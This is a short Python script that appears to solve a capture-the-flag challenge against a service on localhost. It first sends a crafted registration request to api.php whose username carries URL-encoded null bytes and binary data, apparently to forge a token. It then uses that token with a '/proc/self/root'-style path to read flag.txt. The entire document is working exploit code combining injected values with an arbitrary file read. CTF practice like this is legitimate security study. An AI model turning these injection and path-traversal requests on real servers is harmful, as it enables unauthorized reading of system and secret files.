import requests


target = "http://localhost:33336"


token = requests.get(f"{target}/api.php?a=r&u=%37%13%00%00abcde&p=XXXXa*").text
print(requests.get(f"{target}/api.php?a=g&p=c/self/root/flag.txt&t={token}").text)